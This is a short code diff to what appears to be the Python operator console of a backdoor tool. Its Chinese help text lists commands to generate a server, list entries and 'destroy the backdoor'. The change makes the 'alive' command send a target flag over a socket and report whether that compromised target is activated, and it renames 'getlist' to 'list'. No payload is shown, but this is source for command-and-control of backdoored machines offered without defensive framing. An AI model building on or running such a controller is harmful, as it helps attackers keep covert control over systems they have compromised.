@@ -95,9 +95,14 @@ def cserver():
                 print("\n已执行")
             elif cmd == 'alive':
                 sk.send(bytes(cmd, encoding="utf_8"))
-                cmd2 = input("请输入要激活的flag\n")
-                cmd3 = str(cmd2)
-                sk.send(bytes(cmd3, encoding="utf_8"))
+                cmd2 = str(input("请输入要激活的flag\n"))
+                #cmd3 = str(cmd2)
+                sk.send(bytes(cmd2, encoding="utf_8"))
+                ifalive=sk.recv(1024).decode()
+                if ifalive=="1":
+                    print("flag为"+cmd2+"的目标已激活")
+                else:
+                    print("flag为"+cmd2+"的数据不存在")
                 print("\n已执行")
             elif cmd == "exit":
                 print("\n您已离开控制器")
@@ -113,7 +118,7 @@ def cserver():
                 # break
             elif cmd == "help":
                 print("add:生成server并添加一条数据 \n")
-                print("getlist:获取数据列表 \n")
+                print("list:获取数据列表 \n")
                 print("del:销毁后门并删除一条数据 \n")
                 print("exit:退出client \n")
                 print("test:测试连通性 \n")
